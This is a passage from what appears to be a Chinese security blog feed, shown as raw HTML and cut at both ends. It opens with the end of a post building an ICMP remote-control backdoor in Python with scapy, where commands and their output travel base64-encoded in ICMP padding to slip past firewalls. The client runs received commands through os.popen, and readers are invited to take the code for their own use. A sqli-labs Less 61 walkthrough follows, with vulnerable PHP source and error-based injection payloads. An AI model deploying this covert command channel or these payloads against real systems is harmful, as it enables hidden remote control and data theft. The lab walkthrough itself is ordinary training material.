USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    d.server(data=&apos;demo&apos;)</span><br></pre></td></tr></table></figure></p><p>client<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line">        </span><br><span class="line">    def client(self):</span><br><span class="line">        jieshou = sniff(iface=self.eth, filter=&apos;icmp&apos;, count=1, timeout=99999)</span><br><span class="line">        paddings = jieshou[0][&apos;Padding&apos;]</span><br><span class="line">        print(paddings)</span><br><span class="line">        jg = str(paddings).lstrip(&quot;b&apos;&quot;[0]).replace(&quot;&apos;&quot;, &apos;&apos;)</span><br><span class="line">        if jg != &apos;&apos;:</span><br><span class="line">            print(jg)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    d.client()</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/03/03/kqhlCT.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/03/03/kqh8v4.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/03/03/kqhYr9.png" alt="kqhYr9.png"></p><p>由于Padding头最多带的数据好像是1084byte，所以发送数据的时候要进行分段</p><p>为了确保不被防火墙或WAF拦截数据，对传输的数据进行base64编码<br>例子：<br>server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import base64</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def server(self,data):</span><br><span class="line">        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&apos;&#123;&#125;&apos;.format(data))</span><br><span class="line">        send(a,count=1)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    bm=bytes.decode(base64.b64encode(b&apos;demo&apos;))</span><br><span class="line">    d.server(data=bm)</span><br></pre></td></tr></table></figure></p><p>client<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import base64</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line"></span><br><span class="line">    def client(self):</span><br><span class="line">        jieshou = sniff(iface=self.eth, filter=&apos;icmp&apos;, count=1, timeout=99999)</span><br><span class="line">        paddings = jieshou[0][&apos;Padding&apos;]</span><br><span class="line">        jg = str(paddings).lstrip(&quot;b&apos;&quot;[0]).replace(&quot;&apos;&quot;, &apos;&apos;)</span><br><span class="line">        if jg != &apos;&apos;:</span><br><span class="line">            print(bytes.decode(base64.b64decode(jg)))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    d.client()</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/03/03/kqIyMF.png" alt=""></p><p>命令交互：<br>方法：<br>1.发送命令被控端接受命令<br>2.被控端接受了命令并将base64解码执行完成后<br>3.通过逐步读取然后base64编码发送，最后发送执行命令后的长度<br>4.服务端接受返回结果base64解码输出，如果接收到最后的长度就代表接收的数据是完整的</p><p>例子：<br>server:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import base64</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def server(self,data):</span><br><span class="line">        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&apos;&#123;&#125;&apos;.format(data))</span><br><span class="line">        send(a,count=1)</span><br><span class="line"></span><br><span class="line">        self.js()</span><br><span class="line">    def js(self):</span><br><span class="line">        while True:</span><br><span class="line">            jieshou = sniff(iface=self.eth, filter=&apos;icmp&apos;, count=1, timeout=99999)</span><br><span class="line">            paddings = jieshou[0][&apos;Padding&apos;]</span><br><span class="line">            jg = str(paddings).lstrip(&quot;b&apos;&quot;[0]).replace(&quot;&apos;&quot;, &apos;&apos;)</span><br><span class="line">            try:</span><br><span class="line">                if jg != &apos;&apos;:</span><br><span class="line">                    print(bytes.decode(base64.b64decode(jg)))</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            if jg.isdigit()==True:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    bm=bytes.decode(base64.b64encode(b&apos;whoami&apos;))</span><br><span class="line">    d.server(data=bm)</span><br></pre></td></tr></table></figure></p><p>client<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line"></span><br><span class="line">    def fs(self,data):</span><br><span class="line">        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&apos;&#123;&#125;&apos;.format(data))</span><br><span class="line">        send(a,count=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def client(self):</span><br><span class="line">        jieshou = sniff(iface=self.eth, filter=&apos;icmp&apos;, count=1, timeout=99999)</span><br><span class="line">        paddings = jieshou[0][&apos;Padding&apos;]</span><br><span class="line">        jg = str(paddings).lstrip(&quot;b&apos;&quot;[0]).replace(&quot;&apos;&quot;, &apos;&apos;)</span><br><span class="line">        if jg != &apos;&apos;:</span><br><span class="line">            zx=os.popen(bytes.decode(base64.b64decode(jg)))</span><br><span class="line">            q=0</span><br><span class="line">            for z in zx.readlines():</span><br><span class="line">                zb=bytes.decode(base64.b64encode(bytes(z,encoding=&apos;utf-8&apos;)))</span><br><span class="line">                self.fs(zb)</span><br><span class="line">                q+=int(len(zb))</span><br><span class="line"></span><br><span class="line">            self.fs(q)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter&apos;,src=&apos;127.0.0.1&apos;,dst=&apos;192.168.3.75&apos;)</span><br><span class="line">    d.client()</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/03/03/kqLLX6.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/03/03/kqLXnK.png" alt="kqLXnK.png"></p><p><img src="https://s2.ax1x.com/2019/03/03/kqLzAe.png" alt="kqLzAe.png"></p><p>还有一些其他功能，也差不多类似。仓库地址如下（各位可自己修改代码自己用）：<br><a href="https://github.com/422926799/python/tree/master/ICMP%E8%BF%9C%E6%8E%A7" target="_blank" rel="noopener">python/ICMP远控 at master · 422926799/python · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 61 -&gt; sqli labs Less 65</title>
      <link href="/posts/2f16a4c2.html"/>
      <url>/posts/2f16a4c2.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>把sqli-labs玩穿了，感觉学到的东西还是N多的。继续闯一下靶场<br><img src="http://n.sinaimg.cn/sinacn16/142/w1115h627/20181109/a4af-hnprhzw9116450.jpg" alt="a4af-hnprhzw9116450.jpg"></p><p><b>BGM :Lover Boy 88<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1343311848&auto=1&height=66"></iframe></b></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p><b>61关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-61</span>:Challenge<span class="number">-8</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">5</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-61.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>无法正确回显，但是输出了mysql报错。可以使用报错注入<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;challenges&quot;),0x7e),1)</span><br><span class="line">and updatexml(1,concat(0x7e,((select group_concat(`2`) from (select 1,2,3,4 union select * from 表名)a)),0x7e),1)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/24/k4nWa6.md.png" alt="k4nWa6.md.png"></p><p><b>第62关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 